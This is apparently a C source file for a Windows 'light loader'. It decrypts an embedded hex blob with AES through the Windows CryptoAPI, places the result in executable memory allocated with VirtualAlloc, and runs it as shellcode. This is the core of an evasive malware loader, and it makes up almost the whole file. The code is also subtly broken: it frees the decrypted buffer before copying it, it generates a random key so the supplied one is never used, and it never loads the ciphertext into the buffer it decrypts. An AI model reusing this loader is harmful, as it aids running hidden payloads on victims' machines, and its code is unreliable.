// Windows version (light loader)

#include "windows.h"
#include <stdio.h>
#include <stdlib.h>
#include <wincrypt.h>

#define KEY_SIZE 16
#define IV_SIZE 16
#define AES_BLOCK_SIZE 16

unsigned char *aes_decrypt(const char *hex_ciphertext, const char *aes_key_hex, int *plaintext_len);

int main() {
    WORD wVersionRequested;
    WSADATA wsadata;

    wVersionRequested = MAKEWORD(2, 2);
    if (WSAStartup(wVersionRequested, &wsadata) < 0) {
        printf("Startup failed\n");
        exit(1);
    }

    char *code = "17bf339cd661c91be4dbd20358a0355be698dcec4809775e71f47c8a89f06a04f3e191529962d4477404bda26fc4162d";  // Encrypted data (hex)
    char *key = "5369787465656e2062797465206b6579";  // Key (hex)

    int plaintext_len;
    unsigned char *plaintext = aes_decrypt(code, key, &plaintext_len);

    // Print the decrypted data
    for (int i = 0; i < plaintext_len; i++) {
        printf("%c", plaintext[i]);
    }
    free(plaintext);

    // Execute the decrypted shellcode (use with caution)
    void *exec_mem = VirtualAlloc(0, plaintext_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        fprintf(stderr, "VirtualAlloc failed\n");
        exit(1);
    }

    RtlMoveMemory(exec_mem, plaintext, plaintext_len);
    ((void(*)())exec_mem)();

    return 0;
}

unsigned char *aes_decrypt(const char *hex_ciphertext, const char *aes_key_hex, int *plaintext_len) {
    HCRYPTPROV hCryptProv;
    HCRYPTKEY hKey;
    unsigned char aes_key[KEY_SIZE];
    unsigned char iv[IV_SIZE];
    unsigned char *ciphertext;
    unsigned char *plaintext;
    int ciphertext_len = strlen(hex_ciphertext) / 2;
    DWORD decrypted_len;

    // Convert hex key to raw bytes
    for (int i = 0; i < KEY_SIZE; i++) {
        sscanf(aes_key_hex + (i * 2), "%2hhx", &aes_key[i]);
    }

    // Allocate memory for ciphertext
    ciphertext = malloc(ciphertext_len);
    if (ciphertext == NULL) {
        fprintf(stderr, "Error allocating memory\n");
        exit(1);
    }

    // Convert hex ciphertext to raw bytes
    for (int i = 0; i < ciphertext_len; i++) {
        sscanf(hex_ciphertext + (i * 2), "%2hhx", &ciphertext[i]);
    }

    // Extract IV from the first 16 bytes of the ciphertext
    memcpy(iv, ciphertext, IV_SIZE);
    unsigned char *encrypted_data = ciphertext + IV_SIZE;
    int encrypted_data_len = ciphertext_len - IV_SIZE;

    // Allocate memory for the plaintext
    plaintext = malloc(encrypted_data_len + AES_BLOCK_SIZE);
    if (plaintext == NULL) {
        fprintf(stderr, "Error allocating memory\n");
        free(ciphertext);
        exit(1);
    }

    // Initialize the cryptographic provider
    if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        fprintf(stderr, "CryptAcquireContext failed with error %x\n", GetLastError());
        free(ciphertext);
        free(plaintext);
        exit(1);
    }

    // Create the AES key directly using CryptGenKey
    if (!CryptGenKey(hCryptProv, CALG_AES_128, CRYPT_EXPORTABLE, &hKey)) {
        fprintf(stderr, "CryptGenKey failed with error %x\n", GetLastError());
        CryptReleaseContext(hCryptProv, 0);
        free(ciphertext);
        free(plaintext);
        exit(1);
    }

    // Set the key value directly
    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
        fprintf(stderr, "CryptSetKeyParam failed with error %x\n", GetLastError());
        CryptDestroyKey(hKey);
        CryptReleaseContext(hCryptProv, 0);
        free(ciphertext);
        free(plaintext);
        exit(1);
    }

    // Perform decryption
    decrypted_len = encrypted_data_len;
    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, TRUE, 0, plaintext, &decrypted_len)) {
        fprintf(stderr, "CryptDecrypt failed with error %x\n", GetLastError());
        CryptDestroyKey(hKey);
        CryptReleaseContext(hCryptProv, 0);
        free(ciphertext);
        free(plaintext);
        exit(1);
    }

    // Set the final plaintext length
    *plaintext_len = decrypted_len;

    // Cleanup
    CryptDestroyKey(hKey);
    CryptReleaseContext(hCryptProv, 0);

    // Return the decrypted plaintext
    free(ciphertext);
    return plaintext;
}
